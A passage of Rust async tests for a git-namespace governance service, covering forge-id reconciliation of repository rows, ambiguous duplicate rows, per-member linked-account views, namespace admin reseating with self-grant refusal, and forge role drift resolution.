    #[tokio::test]
    async fn p_r1_created_by_id_over_pending_create() {
        let f = fixture().await;
        let ns = bind_bridge(&f).await;
        let y = "github.com/acme/other";
        ok(&event(
            &f,
            &ns,
            json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": y }),
        )
        .await);
        ok(&send(
            &f.vtc.state,
            &f.admin,
            "repo/create",
            json!({ "namespace": ns, "name": "widgets", "visibility": "public", "owners": [f.bob.did] }),
        )
        .await);
        ok(&event(
            &f,
            &ns,
            json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": X }),
        )
        .await);
        let s = snap(&f).await;
        let at = live_at(&s, X);
        assert_eq!(at.len(), 1, "two live rows at X: {at:?}");
    }

    /// Suspected gap: an adopted row at X with forge id None (pre-inspection), forge id 200 known at Y.
    #[tokio::test]
    async fn p_r1_created_by_id_over_forge_less_adopted_row() {
        let f = fixture().await;
        let ns = bind_bridge(&f).await;
        let y = "github.com/acme/other";
        ok(&event(
            &f,
            &ns,
            json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": y }),
        )
        .await);
        ok(&adopt(&f, X, &f.carol).await); // forge id None until inspection
        ok(&event(
            &f,
            &ns,
            json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": X }),
        )
        .await);
        let s = snap(&f).await;
        let at = live_at(&s, X);
        assert_eq!(at.len(), 1, "two live rows at X: {at:?}");
    }

    /// A row found by forge id at a different name gets moved; a governed row at X under another id is folded.
    #[tokio::test]
    async fn p_r1_row_by_forge_id_is_moved() {
        let f = fixture().await;
        let ns = bind_bridge(&f).await;
        let y = "github.com/acme/other";
        ok(&adopt(&f, y, &f.carol).await);
        answer_latest_inspect(&f, y, "200").await;
        ok(&adopt(&f, X, &f.bob).await);
        answer_latest_inspect(&f, X, "300").await;
        let s = snap(&f).await;
        let yid = s.repo_at(y).unwrap().id.clone();
        let xid = s.repo_at(X).unwrap().id.clone();
        ok(&event(
            &f,
            &ns,
            json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": X }),
        )
        .await);
        let s = snap(&f).await;
        assert!(s.repo_at(y).is_none(), "{:?}", s.repo_at(y));
        let at = all_at(&s, X);
        assert_eq!(at.len(), 1, "{at:?}");
        assert_eq!(at[0].id, yid);
        assert_eq!(at[0].forge_id.as_deref(), Some("200"));
        assert!(carol_holds(&s, &yid, &f.carol.did));
        assert!(s.repos.iter().all(|r| r.id != xid), "300 folded");
        assert!(s.rows(&Scope::Repo(xid)).is_empty());
    }

    /// An inspection never records a forge id another live repository holds.
    #[tokio::test]
    async fn an_inspection_does_not_give_a_second_row_a_forge_id_already_held() {
        let f = fixture().await;
        let _ns = bind_bridge(&f).await;
        let y = "github.com/acme/other";
        ok(&adopt(&f, y, &f.carol).await);
        answer_latest_inspect(&f, y, "200").await;
        ok(&adopt(&f, X, &f.bob).await);
        answer_latest_inspect(&f, X, "200").await;
        let s = snap(&f).await;
        assert_eq!(s.repo_at(X).unwrap().forge_id, None);
        assert!(
            s.repo_at(X)
                .unwrap()
                .last_error
                .as_deref()
                .unwrap()
                .contains("200")
        );
        assert_eq!(
            s.repos
                .iter()
                .filter(|r| r.forge_id.as_deref() == Some("200"))
                .count(),
            1
        );
    }

    /// Two live rows at one name are an error to act on, never a guess.
    #[tokio::test]
    async fn two_governed_rows_at_one_name_are_refused_not_guessed() {
        let f = fixture().await;
        let _ns = bind_bridge(&f).await;
        ok(&adopt(&f, X, &f.bob).await);
        let s = snap(&f).await;
        let mut twin = s.repo_at(X).unwrap().clone();
        twin.id = "repo_twin".into();
        store::put_repo(&f.vtc.state.git_ns.ks, &twin)
            .await
            .unwrap();
        let s = snap(&f).await;
        assert!(s.lookup_repo(X).is_err());
        assert!(s.repo_at(X).is_none());
        let out = grant(&f, &f.admin, &f.carol.did, "git.commit.sign", X).await;
        assert_eq!(code(&out), "unavailable");
        let out = adopt(&f, X, &f.carol).await;
        assert_eq!(code(&out), "unavailable");
    }

    // ── the verifier's recheck of c6df22af ──
    const Y: &str = "github.com/acme/other";
    fn live_with_fid(s: &Snapshot, fid: &str) -> Vec<Repo> {
        s.repos
            .iter()
            .filter(|r| r.state != RepoState::Detached && r.forge_id.as_deref() == Some(fid))
            .cloned()
            .collect()
    }
    fn assert_invariants(s: &Snapshot, ctx: &str) {
        let mut names = std::collections::BTreeMap::<String, usize>::new();
        let mut fids = std::collections::BTreeMap::<String, usize>::new();
        for r in s.repos.iter().filter(|r| r.state != RepoState::Detached) {
            *names.entry(r.resource.clone()).or_default() += 1;
            if let Some(f) = &r.forge_id {
                *fids.entry(f.clone()).or_default() += 1;
            }
        }
        assert!(
            names.values().all(|n| *n <= 1),
            "{ctx}: two live rows at a name {:?}",
            s.repos
        );
        assert!(
            fids.values().all(|n| *n <= 1),
            "{ctx}: two live rows with a forge id {:?}",
            s.repos
        );
    }
    async fn ev(f: &Fixture, ns: &str, v: Value) {
        ok(&event(f, ns, v).await);
    }

    /// (a) created(200, X) with 200 known at Y (unmanaged or adopted) and a reservation at X.
    #[tokio::test]
    async fn rc_a_over_reservation_loop() {
        for run in 0..20u64 {
            let mut seed = run * 31 + 5;
            let f = fixture().await;
            let ns = bind_bridge(&f).await;
            let adopted_y = rng(&mut seed).is_multiple_of(2);
            if adopted_y {
                ok(&adopt(&f, Y, &f.carol).await);
                answer_latest_inspect(&f, Y, "200").await;
            } else {
                ev(
                    &f,
                    &ns,
                    json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": Y }),
                )
                .await;
            }
            let before_y = snap(&f).await.repo_at(Y).unwrap().clone();
            ok(&send(
                &f.vtc.state,
                &f.admin,
                "repo/create",
                json!({ "namespace": ns, "name": "widgets", "visibility": "public", "owners": [f.bob.did] }),
            )
            .await);
            let reps = 1 + rng(&mut seed) % 2;
            for _ in 0..reps {
                ev(
                    &f,
                    &ns,
                    json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": X }),
                )
                .await;
            }
            let s = snap(&f).await;
            let at = all_at(&s, X);
            assert_eq!(at.len(), 1, "run {run} adopted_y {adopted_y}: {at:?}");
            assert_eq!(at[0].state, RepoState::PendingCreate, "run {run}");
            assert_eq!(at[0].forge_id, None, "run {run}");
            let y = s.repo_at(Y).unwrap();
            assert_eq!(
                (y.id.clone(), y.state, y.forge_id.clone()),
                (
                    before_y.id.clone(),
                    before_y.state,
                    before_y.forge_id.clone()
                ),
                "run {run}"
            );
            assert_invariants(&s, &format!("run {run}"));
        }
    }

    /// (b) created(200, X) over an adopted row at X with no forge id yet, 200 known at Y; then X's inspection says 200.
    #[tokio::test]
    async fn rc_b_over_fresh_adoption_loop() {
        for run in 0..20u64 {
            let mut seed = run * 97 + 3;
            let f = fixture().await;
            let ns = bind_bridge(&f).await;
            let adopted_y = rng(&mut seed).is_multiple_of(2);
            let y_first = rng(&mut seed).is_multiple_of(2);
            if !y_first {
                ok(&adopt(&f, X, &f.carol).await);
            }
            if adopted_y {
                ok(&adopt(&f, Y, &f.bob).await);
                answer_latest_inspect(&f, Y, "200").await;
            } else {
                ev(
                    &f,
                    &ns,
                    json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": Y }),
                )
                .await;
            }
            if y_first {
                ok(&adopt(&f, X, &f.carol).await);
            }
            let xid = snap(&f).await.repo_at(X).unwrap().id.clone();
            ev(
                &f,
                &ns,
                json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": X }),
            )
            .await;
            let s = snap(&f).await;
            let at = all_at(&s, X);
            assert_eq!(at.len(), 1, "run {run}: {at:?}");
            assert_eq!(at[0].id, xid);
            assert_eq!(at[0].forge_id, None, "run {run}");
            assert!(carol_holds(&s, &xid, &f.carol.did));
            assert_eq!(s.repo_at(Y).unwrap().forge_id.as_deref(), Some("200"));
            assert_invariants(&s, &format!("run {run} pre-inspect"));
            answer_latest_inspect(&f, X, "200").await;
            let s = snap(&f).await;
            assert_eq!(s.repo_at(X).unwrap().forge_id, None, "run {run}");
            assert!(
                s.repo_at(X)
                    .unwrap()
                    .last_error
                    .as_deref()
                    .unwrap_or("")
                    .contains("200")
            );
            assert_eq!(live_with_fid(&s, "200").len(), 1);
            assert_invariants(&s, &format!("run {run} post-inspect"));
        }
    }

    /// Rename window: a row with no forge id (fresh adopt, or re-adopt after unbind) is never moved by a rename.
    #[tokio::test]
    async fn rc_rename_window_loop() {
        for run in 0..20u64 {
            let mut seed = run * 13 + 1;
            let f = fixture().await;
            let mut ns = bind_bridge(&f).await;
            let variant = rng(&mut seed) % 3;
            if variant == 0 {
                ok(&adopt(&f, X, &f.bob).await);
                answer_latest_inspect(&f, X, "100").await;
                ok(&send(
                    &f.vtc.state,
                    &f.admin,
                    "namespace/unbind",
                    json!({ "namespace": ns }),
                )
                .await);
                ns = bind_bridge(&f).await;
            }
            ok(&adopt(&f, X, &f.carol).await);
            let s = snap(&f).await;
            let id = s.repo_at(X).unwrap().id.clone();
            assert_eq!(s.repo_at(X).unwrap().forge_id, None);
            let ev_json = if variant == 2 {
                json!({ "type": "repoRenamed", "from": X, "to": Z })
            } else {
                json!({ "type": "repoRenamed", "forgeId": "100", "from": X, "to": Z })
            };
            let kind = if rng(&mut seed).is_multiple_of(2) {
                "repoRenamed"
            } else {
                "repoTransferred"
            };
            let mut e = ev_json.clone();
            e["type"] = json!(kind);
            let _ = event(&f, &ns, e).await;
            let s = snap(&f).await;
            assert!(s.repo_at(Z).is_none(), "run {run} v{variant} {kind}: moved");
            let at = s.repo_at(X).unwrap();
            assert_eq!(at.id, id);
            assert_eq!(at.state, RepoState::Active, "run {run}: {:?}", at.state);
            assert!(carol_holds(&s, &id, &f.carol.did));
            // Its inspection then reconciles it.
            answer_latest_inspect(&f, X, "300").await;
            assert_eq!(
                snap(&f).await.repo_at(X).unwrap().forge_id.as_deref(),
                Some("300")
            );
            assert_invariants(&snap(&f).await, &format!("run {run}"));
        }
    }

    /// A detached row keeping forge id 200 and a live row holding 200: created(200, X) / rename(200) must act on the live one.
    #[tokio::test]
    async fn rc_detached_and_live_same_forge_id_loop() {
        let mut bad_create = 0;
        let mut bad_rename = 0;
        for _run in 0..30u64 {
            let f = fixture().await;
            let ns = bind_bridge(&f).await;
            ok(&adopt(&f, X, &f.bob).await);
            answer_latest_inspect(&f, X, "200").await;
            ev(
                &f,
                &ns,
                json!({ "type": "repoDeleted", "forgeId": "200", "resource": X }),
            )
            .await;
            ok(&adopt(&f, Y, &f.carol).await);
            answer_latest_inspect(&f, Y, "200").await;
            let s = snap(&f).await;
            let yid = s.repo_at(Y).unwrap().id.clone();
            let y_has = s.repo_at(Y).unwrap().forge_id.clone();
            assert_eq!(
                y_has.as_deref(),
                Some("200"),
                "a detached row does not hold a forge id"
            );
            // rename 200 Y -> Z
            let _ = event(
                &f,
                &ns,
                json!({ "type": "repoRenamed", "forgeId": "200", "from": Y, "to": Z }),
            )
            .await;
            let s = snap(&f).await;
            if y_has.is_some() && s.repo_at(Z).map(|r| r.id.clone()) != Some(yid.clone()) {
                bad_rename += 1;
            }
            ev(
                &f,
                &ns,
                json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": X }),
            )
            .await;
            let s = snap(&f).await;
            let live = live_with_fid(&s, "200");
            if live.len() > 1 {
                bad_create += 1;
            }
        }
        assert_eq!((bad_rename, bad_create), (0, 0));
    }

    /// Inspection: held by a live row -> not recorded; held only by a detached row -> recorded; own id -> fine.
    #[tokio::test]
    async fn rc_inspection_forge_id_rules() {
        for run in 0..20u64 {
            let f = fixture().await;
            let ns = bind_bridge(&f).await;
            // live unmanaged row holds 500
            ev(
                &f,
                &ns,
                json!({ "type": "repoCreatedUnmanaged", "forgeId": "500", "resource": Y }),
            )
            .await;
            ok(&adopt(&f, X, &f.carol).await);
            answer_latest_inspect(&f, X, "500").await;
            let s = snap(&f).await;
            assert_eq!(s.repo_at(X).unwrap().forge_id, None, "run {run}");
            assert_eq!(live_with_fid(&s, "500").len(), 1);
            // a later inspection with a free id is recorded
            ok(&adopt(&f, Z, &f.carol).await);
            answer_latest_inspect(&f, Z, "600").await;
            assert_eq!(
                snap(&f).await.repo_at(Z).unwrap().forge_id.as_deref(),
                Some("600")
            );
            assert_invariants(&snap(&f).await, &format!("run {run}"));
        }
    }

    /// repo_at ambiguity: every write refuses, reads see nothing, events do not add a third.
    #[tokio::test]
    async fn rc_ambiguous_name_every_write_refuses() {
        for run in 0..10u64 {
            let f = fixture_with(GitNsConfig {
                elevated_requires_admin: false,
                ..GitNsConfig::default()
            })
            .await;
            let ns = bind_bridge(&f).await;
            ok(&adopt(&f, X, &f.bob).await);
            answer_latest_inspect(&f, X, "100").await;
            let s = snap(&f).await;
            let orig = s.repo_at(X).unwrap().clone();
            let mut twin = orig.clone();
            twin.id = format!("repo_twin{run}");
            if run % 2 == 1 {
                twin.forge_id = None;
            }
            store::put_repo(&f.vtc.state.git_ns.ks, &twin)
                .await
                .unwrap();
            let s = snap(&f).await;
            assert!(s.lookup_repo(X).is_err());
            assert!(s.repo_at(X).is_none());
            let outs = vec![
                (
                    "grant",
                    grant(&f, &f.admin, &f.carol.did, "git.commit.sign", X).await,
                ),
                ("adopt", adopt(&f, X, &f.carol).await),
                (
                    "create",
                    send(
                        &f.vtc.state,
                        &f.admin,
                        "repo/create",
                        json!({ "namespace": ns, "name": "widgets", "visibility": "public", "owners": [f.bob.did] }),
                    )
                    .await,
                ),
                (
                    "revoke",
                    send(
                        &f.vtc.state,
                        &f.admin,
                        "right/revoke",
                        json!({ "subject": f.bob.did, "right": "git.repo.own", "resource": X }),
                    )
                    .await,
                ),
                (
                    "transfer",
                    send(
                        &f.vtc.state,
                        &f.bob,
                        "repo/transfer",
                        json!({ "resource": X, "to": f.carol.did }),
                    )
                    .await,
                ),
                (
                    "archive",
                    send(
                        &f.vtc.state,
                        &f.admin,
                        "repo/archive",
                        json!({ "resource": X }),
                    )
                    .await,
                ),
            ];
            for (name, out) in outs {
                assert_eq!(
                    code(&out),
                    "unavailable",
                    "run {run} {name}: {}",
                    String::from_utf8_lossy(&out.body)
                );
            }
            // A bridge report of what is at the name now resolves the
            // ambiguity: a governed row there under another forge id has left
            // the name and is detached with its rights. A row with no forge id
            // yet (the odd runs' twin) is the adopted-awaiting-inspection
            // case, and takes up the reported id.
            let _ = event(
                &f,
                &ns,
                json!({ "type": "repoCreatedUnmanaged", "forgeId": "700", "resource": X }),
            )
            .await;
            let s = snap(&f).await;
            let live = live_at(&s, X);
            assert_eq!(live.len(), 1, "run {run}: {:?}", all_at(&s, X));
            assert_eq!(live[0].forge_id.as_deref(), Some("700"));
            let keeps = if twin.forge_id.is_none() {
                assert_eq!(live[0].id, twin.id, "run {run}");
                twin.id.clone()
            } else {
                assert_eq!(live[0].state, RepoState::Unmanaged, "run {run}");
                live[0].id.clone()
            };
            assert_invariants(&s, &format!("run {run}"));
            for id in [&orig.id, &twin.id].into_iter().filter(|id| **id != keeps) {
                assert!(
                    s.rows(&Scope::Repo(id.clone())).is_empty(),
                    "run {run}: {id} kept rights"
                );
                assert!(
                    s.repos
                        .iter()
                        .all(|r| &r.id != id || r.state == RepoState::Detached),
                    "run {run}: {id} still live"
                );
            }
        }
    }
}
// ── follow-ups: git-ns/view 0.2 ─────────────────────────────────────────────

/// Link `who`'s account on `forge` through the bridge, as `accountLinked`.
async fn link_account(f: &Fixture, ns: &str, who: &Party, id: &str, login: &str) {
    let _ = link(f, who).await;
    let job = f.bridge.jobs.lock().unwrap().last().unwrap().1["jobId"].clone();
    ok(&event(
        f,
        ns,
        json!({ "type": "accountLinked", "jobId": job, "account": { "forge": "github.com", "id": id, "login": login } }),
    )
    .await);
}

fn uri2(task: &str) -> String {
    format!("{URI}/{task}/0.2")
}

async fn send_v(state: &AppState, who: &Party, type_uri: &str, payload: Value) -> TrustTaskOutcome {
    let mut doc: TrustTask<Value> =
        vta_sdk::trust_task_sign::build_unsigned(type_uri, payload, &who.did, TEST_VTC_DID)
            .unwrap();
    let key =
        vta_sdk::trust_task_sign::HolderKey::from_did_key(&who.did, &who.secret_multibase).unwrap();
    vta_sdk::trust_task_sign::sign_in_place_with(&mut doc, &key)
        .await
        .unwrap();
    let body = serde_json::to_vec(&doc).unwrap();
    dispatch_trust_task_core(state, &JoinAuthCtx::rest(), &body).await
}

#[tokio::test]
async fn view_0_2_returns_only_the_callers_own_linked_accounts() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    link_account(&f, &ns, &f.bob, "9120045", "bob-builds").await;
    // A second forge for Bob, recorded as a link would.
    crate::members::storage::edit_member(&f.vtc.state.members_ks, &f.bob.did, |m| {
        m.extensions["forges"]["codeberg.org"] =
            json!({ "id": "77", "login": "bob-cb", "linkedAt": "2026-09-23T10:00:00Z" });
        true
    })
    .await
    .unwrap();
    link_account(&f, &ns, &f.carol, "5550001", "carol-c").await;

    let bob = ok(&send_v(&f.vtc.state, &f.bob, &uri2("view"), json!({})).await);
    let accounts = bob["accounts"].as_array().unwrap();
    assert_eq!(accounts.len(), 2, "{bob}");
    assert!(accounts.iter().all(|a| a["account"]["login"] != "carol-c"));
    assert!(accounts.iter().all(|a| a["linkedAt"].is_string()));

    // Narrowed by a resource: its forge only.
    let bob = ok(&send_v(
        &f.vtc.state,
        &f.bob,
        &uri2("view"),
        json!({ "resource": "github.com/acme" }),
    )
    .await);
    assert_eq!(
        bob["accounts"],
        json!([{ "account": { "forge": "github.com", "id": "9120045", "login": "bob-builds" }, "linkedAt": bob["accounts"][0]["linkedAt"] }])
    );

    // An admin sees their own — none — never a member's.
    let admin = ok(&send_v(&f.vtc.state, &f.admin, &uri2("view"), json!({})).await);
    assert_eq!(admin["accounts"], json!([]));

    // 0.1 is still served, without `accounts`.
    let v1 = ok(&send(&f.vtc.state, &f.bob, "view", json!({})).await);
    assert!(v1.get("accounts").is_none());

    // Members only.
    let out = send_v(&f.vtc.state, &f.stranger, &uri2("view"), json!({})).await;
    assert_eq!(code(&out), "permissionDenied");
}

// ── follow-ups: git-ns/namespace/reseat 0.3 ─────────────────────────────────

async fn reseat(f: &Fixture, who: &Party, ns: &str, subject: &str) -> TrustTaskOutcome {
    send_v(
        &f.vtc.state,
        who,
        RESEAT_URI,
        json!({ "namespace": ns, "subject": subject, "statement": "Alice left; Carol owns most repositories" }),
    )
    .await
}

async fn activate_git_policy(f: &Fixture, source: &str) {
    use crate::policy::model::PolicyPurpose;
    use crate::policy::storage::{new_policy, set_active_policy_id, store_policy};
    let id = uuid::Uuid::new_v4();
    let compiled = crate::policy::engine::compile(source, id).unwrap();
    let mut policy = new_policy(
        PolicyPurpose::GitNamespace,
        source.to_string(),
        *compiled.source_sha256(),
        "test".into(),
        2,
    );
    policy.id = id;
    policy.activated_at = Some(chrono::Utc::now());
    store_policy(&f.vtc.state.policies_ks, &policy)
        .await
        .unwrap();
    set_active_policy_id(
        &f.vtc.state.active_policies_ks,
        PolicyPurpose::GitNamespace,
        id,
    )
    .await
    .unwrap();
}

/// A policy that allows everything a member does except `action`.
fn policy_denying(action: &str) -> String {
    format!(
        r#"package vtc.git_namespace

import rego.v1

settings := {{"maintainer_grants_commit": false, "cascade_on_departure": false, "role_drift": "report"}}

default decision := {{"effect": "allow"}}

decision := {{"effect": "deny", "with": {{"code": "not-here", "reason": "this community does not"}}}} if {{
	input.action == "{action}"
}}
"#
    )
}

#[tokio::test]
async fn reseat_restores_an_admin_to_a_headless_namespace_and_answers_every_code() {
    let f = fixture().await;
    let dana = Party::new();
    seed_acl(&f.vtc.state, &dana.did, crate::acl::VtcRole::Admin).await;
    let ns = bind_manual(&f).await;

    // Not headless: the binder still administers it. The refusal names nobody.
    let out = reseat(&f, &dana, &ns, &f.carol.did).await;
    assert_eq!(code(&out), "git-ns/namespace/reseat:notHeadless");
    assert!(!String::from_utf8_lossy(&out.body).contains(&f.admin.did));

    // The only admin leaves: headless.
    crate::acl::delete_acl_entry(&f.vtc.state.acl_ks, &f.admin.did)
        .await
        .unwrap();

    // Step 1 — the capability.
    let out = reseat(&f, &f.bob, &ns, &f.carol.did).await;
    assert_eq!(code(&out), "permissionDenied");
    // Step 2.
    let out = reseat(&f, &dana, "ns_nope", &f.carol.did).await;
    assert_eq!(code(&out), "git-ns:unknownNamespace");
    // Step 4 — separation of duties: reseating to yourself is a self-grant
    // of git.ns.admin, refused with a pointer to break-glass, and nothing is
    // recorded.
    let out = reseat(&f, &dana, &ns, &dana.did).await;
    assert_eq!(code(&out), "git-ns:selfGrantNotAllowed");
    assert!(String::from_utf8_lossy(&out.body).contains("git-ns/right/break-glass"));
    // A console key acting for Dana is Dana: it cannot reseat to her either.
    let console = Party::new();
    crate::acl::console_key::enrol_delegation(
        &f.vtc.state.console_keys_ks,
        &f.vtc.state.acl_ks,
        &console.did,
        &dana.did,
        Some("browser".into()),
        None,
    )
    .await
    .unwrap();
    let out = reseat(&f, &console, &ns, &dana.did).await;
    assert_eq!(code(&out), "git-ns:selfGrantNotAllowed");
    assert!(String::from_utf8_lossy(&out.body).contains("git-ns/right/break-glass"));
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(!super::rules::admins(&snap, &ns, super::ops::now()).contains(&dana.did));
    // Step 4 — members only.
    let out = reseat(&f, &dana, &ns, &f.stranger.did).await;
    assert_eq!(code(&out), "git-ns:membersOnly");
    // Step 5.
    activate_git_policy(&f, &policy_denying("namespace.reseat")).await;
    let out = reseat(&f, &dana, &ns, &f.carol.did).await;
    assert_eq!(code(&out), "git-ns:policyDenied");
    crate::policy::default::install_defaults(
        &f.vtc.state.policies_ks,
        &f.vtc.state.active_policies_ks,
    )
    .await
    .unwrap();
    crate::policy::storage::clear_active_policy_id(
        &f.vtc.state.active_policies_ks,
        crate::policy::model::PolicyPurpose::GitNamespace,
    )
    .await
    .unwrap();
    crate::policy::default::install_defaults(
        &f.vtc.state.policies_ks,
        &f.vtc.state.active_policies_ks,
    )
    .await
    .unwrap();

    // Steps 6-8.
    let body = ok(&reseat(&f, &dana, &ns, &f.carol.did).await);
    assert_eq!(body["right"]["subject"], json!(f.carol.did));
    assert_eq!(body["right"]["right"], "git.ns.admin");
    assert_eq!(body["right"]["grantedBy"], json!(dana.did));
    assert!(body["right"].get("expiresAt").is_none());
    assert!(
        body["right"]["reason"]
            .as_str()
            .unwrap()
            .contains("Alice left")
    );
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(super::rules::admins(&snap, &ns, super::ops::now()).contains(&f.carol.did));

    // A repeat finds it no longer headless.
    let out = reseat(&f, &dana, &ns, &f.bob.did).await;
    assert_eq!(code(&out), "git-ns/namespace/reseat:notHeadless");
}

#[tokio::test]
async fn reseat_refuses_a_pending_namespace_and_counts_a_lapsed_admin_as_gone() {
    let f = fixture().await;
    // Pending: a bridge bind not yet completed.
    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "bridge" }),
    )
    .await);
    let pending = body["namespace"]["id"].as_str().unwrap().to_string();
    let out = reseat(&f, &f.admin, &pending, &f.carol.did).await;
    assert_eq!(code(&out), "git-ns:namespaceNotBound");

    // Headless by lapse: the only admin record has expired, unswept.
    let f = fixture().await;
    let ns = bind_manual(&f).await;
    let scope = Scope::Namespace(ns.clone());
    let mut set = store::get_rights(&f.vtc.state.git_ns.ks, &scope)
        .await
        .unwrap();
    for r in &mut set.rows {
        r.expires_at = Some("2020-01-01T00:00:00Z".parse().unwrap());
    }
    store::put_rights(&f.vtc.state.git_ns.ks, &scope, &set)
        .await
        .unwrap();
    ok(&reseat(&f, &f.admin, &ns, &f.carol.did).await);
}

// ── follow-ups: git-ns/drift/resolve 0.1 ────────────────────────────────────

const RES: &str = "github.com/acme/widgets";

/// A bridge namespace (an organisation), `widgets` owned by Bob with forge id
/// 100, Carol's GitHub account linked, and `drift` reported on `widgets`.
async fn drift_fixture(drift: Value) -> (Fixture, String) {
    let (f, ns) = drift_fixture_unreported(drift).await;
    // A 0.3 bridge reports its map once it serves the namespace.
    report_default_map(&f, &ns).await;
    (f, ns)
}

/// As [`drift_fixture`], before the bridge has reported its role map.
async fn drift_fixture_unreported(drift: Value) -> (Fixture, String) {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    adopt_with_forge_id(&f, RES, "100").await;
    link_account(&f, &ns, &f.carol, "5550001", "carol-c").await;
    report_drift(&f, &ns, drift).await;
    (f, ns)
}

async fn report_drift(f: &Fixture, ns: &str, drift: Value) {
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({
            "namespace": ns,
            "event": { "type": "protectionChanged", "forgeId": "100", "resource": RES, "requiredCheck": true },
            "drift": drift,
        }),
    )
    .await);
}

fn carol_acct() -> Value {
    json!({ "forge": "github.com", "id": "5550001", "login": "carol-c" })
}

fn eve_acct() -> Value {
    json!({ "forge": "github.com", "id": "5550123", "login": "eve-dev" })
}

async fn resolve(f: &Fixture, who: &Party, drift: Value, action: &str) -> TrustTaskOutcome {
    send(
        &f.vtc.state,
        who,
        "drift/resolve",
        json!({ "resource": RES, "drift": drift, "action": action, "reason": "decided" }),
    )
    .await
}

#[tokio::test]
async fn drift_resolve_adopts_a_members_forge_role_as_the_grant_it_is() {
    let (f, _ns) = drift_fixture(json!([
        { "type": "roleAdded", "resource": RES, "account": carol_acct(), "observed": "maintain" },
        { "type": "requiredCheckMissing", "resource": RES }
    ]))
    .await;
    let body = ok(&resolve(
        &f,
        &f.bob,
        json!({ "type": "roleAdded", "account": carol_acct(), "observed": "maintain" }),
        "adopt",
    )
    .await);
    assert_eq!(body["action"], "adopt");
    assert_eq!(body["right"]["subject"], json!(f.carol.did));
    assert_eq!(body["right"]["right"], "git.repo.maintain");
    assert_eq!(body["right"]["grantedBy"], json!(f.bob.did));
    assert_eq!(body["right"]["reason"], "decided");
    // The other item stays; the adopted one is gone.
    assert_eq!(body["sync"]["state"], "drift");
    assert_eq!(body["sync"]["drift"].as_array().unwrap().len(), 1);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let repo = snap.repo_at(RES).unwrap();
    assert!(
        snap.rows(&Scope::Repo(repo.id.clone()))
            .iter()
            .any(|r| { r.subject == f.carol.did && r.right == super::model::Right::RepoMaintain })
    );
    // Resolved already: not found (a client MAY read that as success).
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleAdded", "account": carol_acct(), "observed": "maintain" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), "git-ns/drift/resolve:driftNotFound");
}

/// Fixed rule 7 of `git-ns/right/grant/0.3` binds an adoption too: the
/// namespace admin (who owns every repository in it, so may resolve drift)
/// adopting the forge `admin` role on their *own* linked account would grant
/// themselves `git.repo.own`. Refused, nothing written, the item still
/// outstanding for another community administrator — or a break-glass.
#[tokio::test]
async fn drift_adopt_of_ones_own_account_into_an_elevated_right_is_a_self_grant() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    adopt_with_forge_id(&f, RES, "100").await;
    let admin_acct = json!({ "forge": "github.com", "id": "5550077", "login": "admin-a" });
    link_account(&f, &ns, &f.admin, "5550077", "admin-a").await;
    report_drift(
        &f,
        &ns,
        json!([{ "type": "roleAdded", "resource": RES, "account": admin_acct, "observed": "admin" }]),
    )
    .await;

    let out = resolve(
        &f,
        &f.admin,
        json!({ "type": "roleAdded", "account": admin_acct, "observed": "admin" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), "git-ns:selfGrantNotAllowed");
    assert!(
        payload(&out)["message"]
            .as_str()
            .unwrap()
            .contains("break-glass")
    );

    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let repo = snap.repo_at(RES).unwrap();
    assert!(
        !snap
            .rows(&Scope::Repo(repo.id.clone()))
            .iter()
            .any(|r| r.subject == f.admin.did && r.right == super::model::Right::RepoOwn),
        "a refused self-adoption wrote a right"
    );
    assert_eq!(
        repo.sync.drift.len(),
        1,
        "the drift item stays outstanding for someone who may adopt it"
    );
}

#[tokio::test]
async fn drift_resolve_refuses_what_cannot_be_adopted_with_the_declared_codes() {
    let (f, _ns) = drift_fixture(json!([
        { "type": "roleAdded", "resource": RES, "account": eve_acct(), "observed": "write" },
        { "type": "roleChanged", "resource": RES, "account": carol_acct(), "expected": "maintain", "observed": "triage" },
        { "type": "requiredCheckMissing", "resource": RES, "observed": "off" }
    ]))
    .await;
    // notAdoptable: no right is recorded for a protection item.
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "requiredCheckMissing", "observed": "off" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), "git-ns/drift/resolve:notAdoptable");
    // accountNotLinked: nobody in the community has that account.
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleAdded", "account": eve_acct(), "observed": "write" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), "git-ns/drift/resolve:accountNotLinked");
    // noMatchingRight: no right projects to `triage`.
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleChanged", "account": carol_acct(), "observed": "triage" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), "git-ns/drift/resolve:noMatchingRight");
    // driftNotFound: the forge no longer shows what the caller read.
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleChanged", "account": carol_acct(), "observed": "admin" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), "git-ns/drift/resolve:driftNotFound");

    // notAdoptable: a roleChanged no higher than what the member holds.
    ok(&grant(&f, &f.bob, &f.carol.did, "git.repo.maintain", RES).await);
    report_drift(
        &f,
        &_ns,
        json!([{ "type": "roleChanged", "resource": RES, "account": carol_acct(), "expected": "maintain", "observed": "maintain" }]),
    )
